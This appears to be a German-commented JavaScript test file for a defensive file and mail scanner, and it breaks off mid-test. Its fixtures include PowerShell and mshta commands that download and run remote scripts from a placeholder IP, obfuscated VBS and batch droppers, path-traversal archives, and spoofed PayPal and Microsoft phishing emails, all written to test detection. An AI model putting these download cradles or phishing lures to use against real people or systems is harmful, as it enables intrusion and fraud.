'use strict';

// Tests fuer Dateien, Programme und Erkennungsdaten. Alle Testdateien werden hier erzeugt,
// es gibt keinen echten Netzzugriff (fetch wird ersetzt).

const fs = require('fs');
const os = require('os');
const path = require('path');
const zlib = require('zlib');
const AdmZip = require('adm-zip');

// --- Testdatei-Bauer -------------------------------------------------------------------------
function tarEntry(name, data, type = '0', link = '') {
  const h = Buffer.alloc(512);
  h.write(name.slice(0, 100), 0, 'utf8');
  h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116);
  h.write(data.length.toString(8).padStart(11, '0') + '\0', 124);
  h.write('00000000000\0', 136);
  h.write(type, 156); h.write(link, 157); h.write('ustar\0', 257); h.write('00', 263);
  h.fill(' ', 148, 156);
  let sum = 0; for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
  const pad = Buffer.alloc((512 - (data.length % 512)) % 512);
  return Buffer.concat([h, data, pad]);
}
const tar = (entries) => Buffer.concat([...entries.map((e) => tarEntry(e.name, Buffer.from(e.data || ''), e.type, e.link)), Buffer.alloc(1024)]);

function iso(files) {
  const S = 2048;
  const sectors = 20 + files.length;
  const b = Buffer.alloc(sectors * S);
  const rec = (name, lba, size, dir) => {
    const n = Buffer.from(name, 'latin1');
    const len = 33 + n.length + (n.length % 2 ? 0 : 1);
    const r = Buffer.alloc(len);
    r[0] = len; r.writeUInt32LE(lba, 2); r.writeUInt32BE(lba, 6); r.writeUInt32LE(size, 10); r.writeUInt32BE(size, 14);
    r[25] = dir ? 2 : 0; r[32] = n.length; n.copy(r, 33);
    return r;
  };
  const pvd = b.subarray(16 * S, 17 * S);
  pvd[0] = 1; pvd.write('CD001', 1); pvd[6] = 1;
  rec('\0', 18, S, true).copy(pvd, 156);
  const term = b.subarray(17 * S); term[0] = 255; term.write('CD001', 1);
  const dir = [rec('\0', 18, S, true), rec('\x01', 18, S, true), ...files.map((f, i) => rec(f.name + ';1', 20 + i, f.data.length, false))];
  Buffer.concat(dir).copy(b, 18 * S);
  files.forEach((f, i) => Buffer.from(f.data).copy(b, (20 + i) * S));
  return b;
}

function lnk({ target, args = '', icon = '' }) {
  const h = Buffer.alloc(0x4c);
  h.writeUInt32LE(0x4c, 0);
  Buffer.from('0114020000000000c000000000000046', 'hex').copy(h, 4);
  h.writeUInt32LE(0x08 | 0x20 | 0x40 | 0x80, 0x14);
  h.writeUInt32LE(7, 0x3c);
  const str = (s) => { const n = Buffer.alloc(2); n.writeUInt16LE(s.length); return Buffer.concat([n, Buffer.from(s, 'utf16le')]); };
  return Buffer.concat([h, str(target), str(args), str(icon)]);
}

function pe({ dllChars = 0, is64 = true, signed = false }) {
  const b = Buffer.alloc(1024);
  b.write('MZ', 0); b.writeUInt32LE(0x80, 0x3c);
  b.writeUInt32LE(0x00004550, 0x80);
  const coff = 0x84;
  b.writeUInt16LE(is64 ? 0x8664 : 0x14c, coff); b.writeUInt16LE(0, coff + 2); b.writeUInt16LE(is64 ? 240 : 224, coff + 16); b.writeUInt16LE(0x22, coff + 18);
  const opt = coff + 20;
  b.writeUInt16LE(is64 ? 0x20b : 0x10b, opt); b.writeUInt16LE(3, opt + 68); b.writeUInt16LE(dllChars, opt + 70);
  b.writeUInt32LE(16, opt + (is64 ? 108 : 92));
  if (signed) { const d = opt + (is64 ? 112 : 96) + 4 * 8; b.writeUInt32LE(0x300, d); b.writeUInt32LE(0x100, d + 4); }
  return b;
}

// Kleiner CFB-Schreiber (alle Streams im Mini-Stream) fuer .msg-Tests
function cfb(top, storages = {}) {
  const FREE = 0xffffffff, END = 0xfffffffe;
  const entries = [{ name: 'Root Entry', type: 5 }];
  const streams = [];
  const addStreams = (list) => list.map(([name, data]) => { const e = { name, type: 2, data: Buffer.from(data) }; entries.push(e); streams.push(e); return entries.length - 1; });
  const chainSib = (idxs) => { idxs.forEach((ix, n) => { entries[ix].right = n + 1 < idxs.length ? idxs[n + 1] : FREE; }); return idxs.length ? idxs[0] : FREE; };
  const topIdx = addStreams(top);
  const storIdx = Object.entries(storages).map(([name, list]) => { entries.push({ name, type: 1 }); const ix = entries.length - 1; entries[ix].child = chainSib(addStreams(list)); return ix; });
  entries[0].child = chainSib([...topIdx, ...storIdx]);
  let mini = Buffer.alloc(0); const miniFat = [];
  for (const s of streams) {
    const start = mini.length / 64; const n = Math.max(1, Math.ceil(s.data.length / 64));
    for (let i = 0; i < n; i++) miniFat.push(i + 1 < n ? start + i + 1 : END);
    s.start = start; s.size = s.data.length;
    mini = Buffer.concat([mini, s.data, Buffer.alloc(n * 64 - s.data.length)]);
  }
  const dirSecs = Math.ceil(entries.length * 128 / 512), miniSecs = Math.max(1, Math.ceil(mini.length / 512)), mfSecs = Math.max(1, Math.ceil(miniFat.length * 4 / 512));
  const dirStart = 1, miniStart = dirStart + dirSecs, mfStart = miniStart + miniSecs, total = mfStart + mfSecs;
  const fat = new Array(128).fill(FREE); fat[0] = 0xfffffffd;
  const chain = (s, n) => { for (let i = 0; i < n; i++) fat[s + i] = i + 1 < n ? s + i + 1 : END; };
  chain(dirStart, dirSecs); chain(miniStart, miniSecs); chain(mfStart, mfSecs);
  const out = Buffer.alloc(512 * (total + 1));
  Buffer.from('d0cf11e0a1b11ae1', 'hex').copy(out, 0);
  out.writeUInt16LE(0x3e, 0x18); out.writeUInt16LE(3, 0x1a); out.writeUInt16LE(0xfffe, 0x1c); out.writeUInt16LE(9, 0x1e); out.writeUInt16LE(6, 0x20);
  out.writeUInt32LE(1, 0x2c); out.writeUInt32LE(dirStart, 0x30); out.writeUInt32LE(4096, 0x38); out.writeUInt32LE(mfStart, 0x3c); out.writeUInt32LE(mfSecs, 0x40); out.writeUInt32LE(END, 0x44);
  for (let i = 0; i < 109; i++) out.writeUInt32LE(i === 0 ? 0 : FREE, 0x4c + i * 4);
  const sec = (n) => 512 * (n + 1);
  fat.forEach((v, i) => out.writeUInt32LE(v >>> 0, sec(0) + i * 4));
  entries.forEach((e, i) => {
    const o = sec(dirStart) + i * 128;
    const nm = Buffer.from(e.name + '\0', 'utf16le'); nm.copy(out, o); out.writeUInt16LE(nm.length, o + 0x40);
    out[o + 0x42] = e.type; out.writeUInt32LE((e.left ?? FREE) >>> 0, o + 0x44); out.writeUInt32LE((e.right ?? FREE) >>> 0, o + 0x48); out.writeUInt32LE((e.child ?? FREE) >>> 0, o + 0x4c);
    if (e.type === 5) { out.writeUInt32LE(miniStart, o + 0x74); out.writeUInt32LE(mini.length, o + 0x78); }
    if (e.type === 2) { out.writeUInt32LE(e.start, o + 0x74); out.writeUInt32LE(e.size, o + 0x78); }
  });
  mini.copy(out, sec(miniStart));
  miniFat.forEach((v, i) => out.writeUInt32LE(v >>> 0, sec(mfStart) + i * 4));
  return out;
}
const u16 = (s) => Buffer.from(s, 'utf16le');

module.exports = async function run(check) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-files-'));
  const all = []; // alle erzeugten Befunde -> Uebersetzungs-Test am Ende
  const keep = (list) => { all.push(...list); return list; };
  const { ingestTargets } = require('../src/core/ingest');
  const archives = require('../src/core/archives');

  // --- Archive ---
  {
    const enc = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')", 'utf16le').toString('base64');
    const t = tar([
      { name: 'paket/run.ps1', data: `powershell.exe -nop -w hidden -enc ${enc}` },
      { name: '../../evil.txt', data: 'x' },
      { name: 'paket/link', type: '2', link: '/etc/passwd' },
      { name: 'paket/readme.txt', data: 'hallo' },
    ]);
    const p = archives.parseTar(t);
    check('archiv: tar wird gelesen, Pfad-Ausbruch und Symlink erkannt', p.entries.length === 3 && p.unsafe.length === 2 && p.entries.some((e) => e.name === 'evil.txt'));
    fs.writeFileSync(path.join(tmp, 'paket.tar.gz'), zlib.gzipSync(t));
    const ing = await ingestTargets([{ type: 'path', value: path.join(tmp, 'paket.tar.gz') }]);
    keep(ing.findings);
    check('archiv: tar.gz entpackt, Skript darin geprüft', ing.findings.some((f) => f.ruleId === 'script-obfuscated' && f.location.includes('paket.tar.gz!/paket/run.ps1') && f.severity === 'high'));
    check('archiv: Pfad-Ausbruch als Befund (Zip Slip)', ing.findings.some((f) => f.ruleId === 'archive-path-traversal'));
    check('archiv: gz-Bombe wird gestoppt', archives.gunzipLimited(zlib.gzipSync(Buffer.alloc(200000)), { maxTotalBytes: 1000 }).error === 'bomb');
    // adm-zip bereinigt Namen beim Anlegen – den Pfad-Ausbruch daher direkt in die Bytes schreiben
    const zip = new AdmZip(); zip.addFile('AA/AA/AA/Windows/x.dll', Buffer.from('MZ')); zip.addFile('ok.txt', Buffer.from('hi'));
    fs.writeFileSync(path.join(tmp, 'slip.zip'), Buffer.from(zip.toBuffer().toString('latin1').split('AA/AA/AA/').join('../../../'), 'latin1'));
    const iz = await ingestTargets([{ type: 'path', value: path.join(tmp, 'slip.zip') }]);
    keep(iz.findings);
    check('archiv: ZIP mit ../ wird gemeldet', iz.findings.some((f) => f.ruleId === 'archive-path-traversal'));
    const img = iso([{ name: 'RECHNUNG.LNK', data: lnk({ target: 'C:\\Windows\\System32\\cmd.exe', args: '/c start mshta http://203.0.113.9/x.hta' }) }, { name: 'README.TXT', data: 'Lies mich' }]);
    const pi = archives.parseIso((o, l) => img.subarray(o, o + l), img.length);
    check('archiv: ISO 9660 wird ohne Werkzeug gelesen', pi && pi.entries.length === 2 && pi.entries[0].name === 'RECHNUNG.LNK');
    fs.writeFileSync(path.join(tmp, 'rechnung.iso'), img);
    const ii = await ingestTargets([{ type: 'path', value: path.join(tmp, 'rechnung.iso') }]);
    keep(ii.findings);
    check('archiv: ISO mit Verknüpfung -> Warnung (startbare Dateien im Abbild)', ii.findings.some((f) => f.ruleId === 'image-contains-executable' && f.severity === 'high'));
    check('archiv: Verknüpfung im ISO geprüft', ii.findings.some((f) => f.ruleId === 'lnk-launches-system-tool' && /rechnung\.iso!\/RECHNUNG\.LNK/.test(f.location)));
    const list = archives.parse7zList('7-Zip 23.01\n\n--\nPath = x.7z\nType = 7z\n\n----------\nPath = a/b.exe\nFolder = -\nSize = 1200\nPacked Size = 300\nAttributes = A\n\nPath = a\nFolder = +\nSize = 0\nAttributes = D\n\nPath = ../c.txt\nFolder = -\nSize = 5\n');
    check('archiv: 7-Zip-Liste wird gelesen (Ordner ausgelassen, Pfad-Ausbruch erkannt)', list.filter((x) => !x.dir).length === 2 && archives.safeName(list.find((x) => x.name === '../c.txt').name).unsafe);
    fs.writeFileSync(path.join(tmp, 'kaputt.rar'), Buffer.from('Rar!\x1a\x07\x00 kein echtes Archiv'));
    const ir = await ingestTargets([{ type: 'path', value: path.join(tmp, 'kaputt.rar') }]);
    check('archiv: RAR ohne/mit 7-Zip ohne Absturz (fehlendes 7-Zip nur als Hinweis)', ir.findings.length === 0 && (ir.notes.some((n) => /7-Zip fehlt/.test(n)) || ir.notes.some((n) => /Archiv/.test(n))));
    check('archiv: Formate richtig zugeordnet', archives.archiveKind('a.TGZ') === 'tgz' && archives.archiveKind('a.rar') === '7z' && archives.archiveKind('a.iso') === 'iso' && archives.archiveKind('a.vhdx') === '7z' && archives.archiveKind('a.txt') === null);
  }

  // --- Skripte ---
  {
    const { analyzeScript, decodePsEncoded } = require('../src/core/scriptobf');
    const enc = Buffer.from('Write-Host hallo', 'utf16le').toString('base64');
    check('skript: -EncodedCommand wird dekodiert', decodePsEncoded(enc) === 'Write-Host hallo');
    const vbs = 'Set s = CreateObject("WScript.Shell")\n' + 'x = ' + Array.from({ length: 20 }, (_, i) => `Chr(${100 + i})`).join(' & ') + '\nExecute x\ns.Run "cmd /c " & x\n';
    keep(analyzeScript(vbs, 'a/drop.vbs'));
    check('skript: VBS aus Zeichencodes + Execute erkannt', analyzeScript(vbs, 'a/drop.vbs').some((f) => f.ruleId === 'script-obfuscated'));
    const bat = '@echo off\nset a=powershell\n' + Array.from({ length: 8 }, () => 'c^m^d /c e^c^h^o %a:~0,4%%a:~4,3%').join('\n');
    check('skript: Batch mit ^ und %var:~x,y% erkannt', analyzeScript(bat, 'x.bat').length === 1);
    check('skript: harmloses PowerShell bleibt ohne Befund', analyzeScript('Get-ChildItem C:\\Temp | Where-Object { $_.Length -gt 10 }\nWrite-Host "fertig"', 'ok.ps1').length === 0);
    check('skript: normales JavaScript bleibt ohne Befund', analyzeScript('const s = String.fromCharCode(72, 105); eval(s);\nmodule.exports = { s };', 'lib.js').length === 0);
  }

  // --- Verknuepfungen ---
  {
    const { parseLnk, analyzeLnk } = require('../src/core/lnk');
    const b = lnk({ target: '..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', args: ' '.repeat(40) + '-nop -w hidden -enc ' + 'QQB'.repeat(20), icon: '%SystemRoot%\\System32\\imageres.dll' });
    const l = parseLnk(b);
    check('lnk: Ziel, Argumente und Symbol gelesen', l && /powershell\.exe$/.test(l.target) && /-enc/.test(l.arguments) && /imageres/.test(l.iconLocation));
    const f = keep(analyzeLnk(b, 'mail/Rechnung.pdf.lnk'));
    check('lnk: PowerShell mit kodiertem Befehl -> kritisch', f.length === 1 && f[0].severity === 'critical' && /powershell\.exe/.test(f[0].title));
    check('lnk: gewöhnliche Verknüpfung ohne Argumente bleibt still', analyzeLnk(lnk({ target: 'C:\\Windows\\System32\\cmd.exe' }), 'Eingabeaufforderung.lnk').length === 0);
    check('lnk: kein LNK -> nichts', parseLnk(Buffer.from('nicht lnk')) === null);
  }

  // --- PE-Schutzfunktionen ---
  {
    const { parsePe, analyzePeHardening } = require('../src/core/pehard');
    const bad = keep(analyzePeHardening(pe({ dllChars: 0 }), 'bin/alt.exe'));
    check('pe: fehlende Schutzfunktionen erkannt (ASLR, DEP, CFG)', bad.length === 1 && bad[0].severity === 'medium' && /ASLR/.test(bad[0].description) && /DEP/.test(bad[0].description) && /CFG/.test(bad[0].description));
    check('pe: vollständig gehärtet -> kein Befund', analyzePeHardening(pe({ dllChars: 0x4160, signed: true }), 'gut.exe').length === 0 && parsePe(pe({ dllChars: 0x4160, signed: true })).signed);
    check('pe: nur CFG fehlt -> niedrig', analyzePeHardening(pe({ dllChars: 0x0160 }), 'cfg.exe')[0].severity === 'low');
    const { analyzeBinary } = require('../src/core/binaryaudit');
    check('pe: Binary-Prüfung enthält die Härtung', analyzeBinary(pe({ dllChars: 0 }), 'x.dll').some((x) => x.ruleId === 'pe-hardening-missing'));
  }

  // --- Eingebaute Bibliotheken ---
  {
    const bundled = require('../src/core/bundled');
    const buf = Buffer.concat([Buffer.alloc(64), Buffer.from('OpenSSL 1.0.2k  26 Jan 2017\0deflate 1.2.11 Copyright 1995-2017 Jean-loup Gailly\0libcurl/8.6.0\0'), Buffer.alloc(64)]);
    const libs = bundled.detectBundled(buf);
    check('bundled: Versionen von OpenSSL, zlib, curl erkannt', libs.some((l) => l.lib === 'openssl' && l.version === '1.0.2k') && libs.some((l) => l.lib === 'zlib' && l.version === '1.2.11') && libs.some((l) => l.lib === 'curl'));
    const f = keep(bundled.bundledFindings(libs, 'app/tool.exe', { now: Date.parse('2026-11-05') }));
    check('bundled: zlib-Lücke und OpenSSL-Support-Ende gemeldet, aktuelles curl nicht', f.some((x) => x.ruleId === 'bundled-zlib-CVE-2018-25032') && f.some((x) => x.ruleId === 'bundled-openssl-eol') && !f.some((x) => /curl/.test(x.ruleId)));
    check('bundled: Support-Ende erst ab Datum', !bundled.bundledFindings([{ lib: 'openssl', version: '3.0.15' }], 'x', { now: Date.parse('2026-01-01') }).length && bundled.bundledFindings([{ lib: 'openssl', version: '3.0.15' }], 'x', { now: Date.parse('2026-11-05') }).length === 1);
    check('bundled: Versionsvergleich mit Buchstaben', bundled.cmp('1.0.1f', '1.0.1g') < 0 && bundled.cmp('1.0.2', '1.0.2a') < 0 && bundled.cmp('2.0-beta9', '2.0') < 0);
    const jar = new AdmZip(); jar.addFile('META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties', Buffer.from('version=2.14.1\ngroupId=org.apache.logging.log4j\nartifactId=log4j-core\n')); jar.addFile('org/x/A.class', Buffer.from([0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 52]));
    const war = new AdmZip(); war.addFile('WEB-INF/lib/log4j-core-2.14.1.jar', jar.toBuffer());
    fs.writeFileSync(path.join(tmp, 'shop.war'), war.toBuffer());
    const iw = await ingestTargets([{ type: 'path', value: path.join(tmp, 'shop.war') }]);
    check('bundled: log4j in JAR in WAR -> Maven-Paket für den CVE-Abgleich', iw.bundledDeps.some((d) => d.ecosystem === 'Maven' && d.name === 'org.apache.logging.log4j:log4j-core' && d.version === '2.14.1'));
  }

  // --- E-Mails ---
  {
    const mail = require('../src/core/mail');
    const att = Buffer.from('MZ fake').toString('base64');
    const eml = [
      'From: =?utf-8?B?UGF5UGFsIFNlcnZpY2U=?= <security@paypa1-secure.xyz>',
      'Reply-To: <collect@mailbox-0815.ru>',
      'Subject: =?iso-8859-1?Q?Konto_gesperrt_=FCberpr=FCfen?=',
      'Authentication-Results: mx.example.de; spf=fail smtp.mailfrom=paypa1-secure.xyz; dkim=none; dmarc=fail header.from=paypa1-secure.xyz',
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="XYZ"',
      '',
      '--XYZ',
      'Content-Type: text/html; charset=utf-8',
      'Content-Transfer-Encoding: quoted-printable',
      '',
      '<p>Bitte <a href=3D"http://evil-login.example/paypal/">https://www.paypal.com/login</a> best=C3=A4tigen.</p>',
      '--XYZ',
      'Content-Type: application/octet-stream; name="Rechnung.pdf.exe"',
      'Content-Disposition: attachment; filename="Rechnung.pdf.exe"',
      'Content-Transfer-Encoding: base64',
      '',
      att,
      '--XYZ--',
      '',
    ].join('\r\n');
    const m = mail.parseEml(Buffer.from(eml));
    check('mail: MIME gelesen (Kopf kodiert, HTML, Anhang)', mail.decodeWords(m.headers.subject[0]) === 'Konto gesperrt überprüfen' && m.html[0].includes('bestätigen') && m.attachments[0].name === 'Rechnung.pdf.exe' && m.attachments[0].data.toString() === 'MZ fake');
    const r = mail.analyzeMail(m, 'post/rechnung.eml');
    keep(r.findings);
    const ids = r.findings.map((f) => f.ruleId);
    check('mail: Antwortadresse fremd, Markenname gefälscht, DMARC fehlgeschlagen', ids.includes('mail-replyto-mismatch') && ids.includes('mail-brand-impersonation') && ids.includes('mail-auth-failed'));
    check('mail: Link-Text zeigt andere Domain als Ziel', ids.includes('mail-link-mismatch'));
    check('mail: getarnter Anhang erkannt', ids.includes('mail-dangerous-attachment'));
    check('mail: Links für den Phishing-Abgleich gesammelt', r.urls.includes('http://evil-login.example/paypal/'));
    const spoof = mail.analyzeMail(mail.parseEml(Buffer.from('From: "chef@firma.de" <chef.firma@gmail.com>\r\nSubject: Dringend\r\n\r\nBitte ueberweisen.')), 'x.eml');
    keep(spoof.findings);
    check('mail: Anzeigename mit fremder Adresse -> Spoofing', spoof.findings.some((f) => f.ruleId === 'mail-display-name-spoof' && f.severity === 'high'));
    const ok = mail.analyzeMail(mail.parseEml(Buffer.from('From: Anna <anna@firma.de>\r\nReply-To: anna@mail.firma.de\r\nSubject: Hallo\r\n\r\nSiehe https://firma.de/info')), 'ok.eml');
    check('mail: normale Mail bleibt ohne Befund', ok.findings.length === 0);
    // Outlook .msg (OLE)
    const msg = cfb([
      ['__substg1.0_0037001F', u16('Ihr Konto')],
      ['__substg1.0_0C1A001F', u16('Microsoft Konto-Team')],
      ['__substg1.0_5D01001F', u16('alert@micros0ft-support.top')],
      ['__substg1.0_1000001F', u16('Bitte hier anmelden: https://evil-login.example/ms/ sofort.')],
    ], { '__attach_version1.0_#00000000': [['__substg1.0_3707001F', u16('update.js')], ['__substg1.0_37010102', Buffer.from('var a=1;')]] });
    const pm = mail.parseMsg(msg);
    check('mail: Outlook-.msg gelesen (Absender, Text, Anhang)', pm && /micros0ft/.test(pm.headers.from[0]) && /evil-login/.test(pm.text[0]) && pm.attachments[0].name === 'update.js' && pm.attachments[0].data.toString() === 'var a=1;');
    const rm = keep(mail.analyzeMail(pm, 'x.msg').findings);
    check('mail: .msg mit Marke und Skript-Anhang gemeldet', rm.some((f) => f.ruleId === 'mail-brand-impersonation') && rm.some((f) => f.ruleId === 'mail-dangerous-attachment'));
    // Anhang wird wie eine Datei geprueft
    const withLnk = eml.replace('Rechnung.pdf.exe', 'Rechnung.lnk').replace('Rechnung.pdf.exe', 'Rechnung.lnk').replace(att, lnk({ target: 'C:\\Windows\\System32\\mshta.exe', args: 'http://203.0.113.9/x.hta' }).toString('base64'));
    fs.writeFileSync(path.join(tmp, 'post.eml'), withLnk);
    const ie = await ingestTargets([{ type: 'path', value: path.join(tmp, 'post.eml') }]);
    keep(ie.findings);
    check('mail: Anhang (Verknüpfung) wird mitgeprüft', ie.findings.some((f) => f.ruleId === 'lnk-launches-system-tool' && f.location.includes('post.eml!/Rechnung.lnk')) && ie.links.some((l) => l.url.includes('evil-login')));
  }

  // --- Links gegen Phishing-Listen ---
  {
    const lc = require('../src/core/linkcheck');
    const lists = [{ source: 'OpenPhish', urls: ['https://evil-login.example/paypal/', 'https://sites.google.com/view/fake-bank'] }, { source: 'URLhaus', urls: ['http://shop.meine-firma.de/wp-content/x.php'] }];
    const idx = lc.buildPhishIndex(lists);
    check('links: Treffer über Adresse und Host, geteilte Dienste nur exakt', !!lc.matchUrl('https://evil-login.example/other', idx) && !!lc.matchUrl('https://sites.google.com/view/fake-bank', idx) && !lc.matchUrl('https://sites.google.com/view/echte-seite', idx));
    const pdf = Buffer.from('%PDF-1.4\n1 0 obj << /Type /Annot /A << /S /URI /URI (https://evil-login.example/paypal/) >> >>\nendobj\n%%EOF');
    const docx = new AdmZip(); docx.addFile('word/_rels/document.xml.rels', Buffer.from('<Relationships><Relationship Id="r1" Type="http://x/hyperlink" Target="https://evil-login.example/doc" TargetMode="External"/></Relationships>'));
    check('links: URLs aus PDF und Word gelesen', lc.extractDocUrls(pdf, '.pdf').includes('https://evil-login.example/paypal/') && lc.extractDocUrls(docx.toBuffer(), '.docx').includes('https://evil-login.example/doc'));
    const f = keep(lc.checkLinks([{ url: 'https://evil-login.example/paypal/', label: 'post/a.pdf' }, { url: 'https://example.org/', label: 'post/a.pdf' }], idx));
    check('links: Phishing-Link im Dokument wird gemeldet', f.length === 1 && f[0].ruleId === 'phishing-link' && f[0].confidence === 'high');
    const own = keep(lc.checkOwnDomains(['www.meine-firma.de'], idx, lists));
    check('links: eigene Domain auf der Liste -> kritisch', own.length === 1 && own[0].severity === 'critical' && /URLhaus/.test(own[0].description));
  }

  // --- Feeds: neue Quellen ---
  {
    const feeds = require('../src/core/feeds');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-feeds2-'));
    const urls = Array.from({ length: 30 }, (_, i) => `https://phish${i}.example/login`).join('\n');
    const rss = `<rss><channel>${Array.from({ length: 4 }, (_, i) => `<item><title>[UPDATE] lodash: Schwachstelle ermöglicht Codeausführung ${i}</title><link>https://wid.cert-bund.de/portal/wid/securityadvisory?name=WID-SEC-2026-${i}</link><pubDate>Mon, 02 Nov 2026 10:00:00 +0100</pubDate><description><![CDATA[Ein Angreifer kann &amp; mehr.]]></description></item>`).join('')}</channel></rss>`;
    const yar = Array.from({ length: 4 }, (_, i) => `rule Demo_${i} { strings: $a = "evil${i}" condition: $a }`).join('\n');
    const byId = (id) => feeds.FEEDS.find((f) => f.id === id);
    const bodies = { [byId('openphish').urls[0]]: urls, [byId('urlhaus').urls[0]]: '# kommentar\n' + urls.replace(/phish/g, 'mal'), [byId('certbund').urls[0]]: rss, [byId('yara-rules').urls[0]]: yar };
    const calls = [];
    const fake = async (url) => { calls.push(url); const b = bodies[url]; return { ok: b !== undefined, status: b === undefined ? 404 : 200, arrayBuffer: async () => Buffer.from(b || '') }; };
    let nucleiCalls = 0;
    const ctx = { tools: { yara: true, semgrep: false }, updaters: { 'nuclei-templates': async () => { nucleiCalls++; return { ok: true }; } } };
    const r = await feeds.syncFeeds(dir, { fetchImpl: fake, ctx });
    const res = (id) => r.find((x) => x.id === id);
    check('feeds: Phishing-Listen, BSI-Meldungen und YARA-Regeln geladen', res('openphish').ok && res('openphish').count === 30 && res('urlhaus').ok && res('certbund').count === 4 && res('yara-rules').ok && res('yara-rules').count === 4);
    check('feeds: Semgrep-Regeln ohne Werkzeug nicht geladen', res('semgrep-rules').inactive && !calls.some((u) => u.includes('semgrep')));
    check('feeds: nuclei-Vorlagen über das Werkzeug selbst aktualisiert', res('nuclei-templates').ok && nucleiCalls === 1);
    const c = feeds.loadCompiled(dir);
    check('feeds: Phishing-Index und YARA-Datei bereit', c.phish.size === 60 && c.yaraFile && fs.readFileSync(c.yaraFile, 'utf8').includes('rule Demo_3') && c.advisories[0].summary === 'Ein Angreifer kann & mehr.');
    const st = feeds.feedStatus(dir, { tools: {} });
    check('feeds: Status zeigt Einheit und inaktive Quellen', st.find((x) => x.id === 'openphish').unit === 'Adressen' && st.find((x) => x.id === 'yara-rules').inactive && st.find((x) => x.id === 'yara-rules').count === 4);
    let blocked = false; try { await feeds.fetchLimited('https://evil.example/x', 100, fake); } catch (e) { blocked = /nicht erlaubt/.test(e.message); }
    check('feeds: fremde Quellen werden abgelehnt', blocked);
    let bad = false; try { byId('yara-rules').parse('include "x.yar"\n' + yar); } catch { bad = true; }
    check('feeds: YARA-Regeln mit include werden nicht übernommen', bad);
  }

  // --- YARA ---
  {
    const y = require('../src/core/yara');
    const hits = y.parseYaraOutput('Webshell_PHP C:\\site\\up.php\nWebshell_Gen C:\\site\\up.php\nMimikatz C:\\t\\m.exe\nwarning: slow rule\n');
    const f = keep(y.yaraFindings(hits, 'eigene.yar'));
    check('yara: Ausgabe gelesen, je Datei ein Befund', hits.length === 3 && f.length === 2 && /Webshell_PHP, Webshell_Gen/.test(f[0].title));
    const r = await y.runYara(tmp, { rulesDir: path.join(tmp, 'gibt-es-nicht') });
    check('yara: ohne Regeln still übersprungen', !r.ran && !r.findings.length && !r.notes.length);
  }

  // --- OSV offline ---
  {
    const off = require('../src/core/osvoffline');
    const { offlineFindings } = require('../src/core/cve');
    const z = new AdmZip();
    z.addFile('GHSA-35jh-r3h4-6jhm.json', Buffer.from(JSON.stringify({ id: 'GHSA-35jh-r3h4-6jhm', aliases: ['CVE-2021-23337'], summary: 'Command Injection in lodash', database_specific: { severity: 'HIGH' }, affected: [{ package: { ecosystem: 'npm', name: 'lodash' }, ranges: [{ type: 'SEMVER', events: [{ introduced: '0' }, { fixed: '4.17.21' }] }] }] })));
    z.addFile('PYSEC-1.json', Buffer.from(JSON.stringify({ id: 'PYSEC-1', affected: [{ package: { ecosystem: 'PyPI', name: 'x' }, versions: ['1.0'] }] })));
    z.addFile('MAL-1.json', Buffer.from(JSON.stringify({ id: 'MAL-1', summary: 'Malicious code in evil-pkg', affected: [{ package: { ecosystem: 'npm', name: 'evil-pkg' }, versions: ['1.0.0', '1.0.1'] }] })));
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-osv-'));
    const asked = [];
    const fake = async (url) => { asked.push(url); return { ok: true, status: 200, arrayBuffer: async () => z.toBuffer() }; };
    const ecos = off.ecosystemsOf({ t1: { packages: [{ ecosystem: 'npm', name: 'lodash', version: '4.17.20' }, { ecosystem: 'Unbekannt', name: 'y', version: '1' }] } });
    const r = await off.syncOffline(dir, ecos, { fetchImpl: fake });
    check('osv-offline: nur vorhandene Ökosysteme geladen', ecos.join() === 'npm' && asked.length === 1 && asked[0] === off.BASE + 'npm/all.zip' && r[0].ok && r[0].count === 2);
    const q = off.createOfflineQuery(dir);
    const hits = q([{ ecosystem: 'npm', name: 'lodash', version: '4.17.20' }, { ecosystem: 'npm', name: 'lodash', version: '4.17.21' }, { ecosystem: 'npm', name: 'evil-pkg', version: '1.0.1' }]);
    check('osv-offline: Versionsbereiche und Versionslisten richtig ausgewertet', hits.has('npm|lodash|4.17.20') && !hits.has('npm|lodash|4.17.21') && hits.has('npm|evil-pkg|1.0.1'));
    const of = keep(offlineFindings([{ ecosystem: 'npm', name: 'lodash', version: '4.17.20' }], q).findings);
    check('osv-offline: Befund wie online (CVE, behoben ab)', of.length === 1 && /CVE-2021-23337/.test(of[0].title) && of[0].severity === 'high' && of[0].package.fixed === '4.17.21');
    const r2 = await off.syncOffline(dir, ['npm'], { fetchImpl: fake });
    check('osv-offline: frischer Vorrat wird nicht erneut geladen', r2[0].skipped && asked.length === 1);
  }

  // --- Hintergrund-Ueberwachung ---
  {
    const w = require('../src/core/watch');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-watch-'));
    const sboms = { t1: { packages: [{ ecosystem: 'npm', name: 'lodash', version: '4.17.20' }, { ecosystem: 'npm', name: 'express', version: '4.18.0' }] } };
    let known = ['GHSA-old'];
    const query = async (pkgs) => new Map(pkgs.map((p) => [`${p.ecosystem}|${p.name}|${p.version}`, p.name === 'lodash' ? known.map((id) => ({ id })) : []]));
    const details = async (id) => ({ summary: 'Prototype Pollution in lodash', aliases: ['CVE-2026-0001'], database_specific: { severity: 'CRITICAL' } });
    const s1 = await w.checkSbomCves(sboms, path.join(dir, 's.json'), { query, details });
    check('neue-cve: erster Lauf merkt nur den Ist-Stand', s1.alerts.length === 0 && s1.checked === 2);
    known = ['GHSA-old', 'GHSA-new'];
    const s2 = await w.checkSbomCves(sboms, path.join(dir, 's.json'), { query, details });
    keep(s2.alerts.map((a) => ({ title: a.title, description: a.detail })));
    check('neue-cve: neue Meldung für gespeichertes Paket -> Hinweis', s2.alerts.length === 1 && s2.alerts[0].severity === 'critical' && /lodash 4\.17\.20: CVE-2026-0001/.test(s2.alerts[0].title) && s2.alerts[0].targets[0] === 't1');
    const added = w.addAlerts(path.join(dir, 'a.json'), [...s2.alerts, ...s2.alerts]);
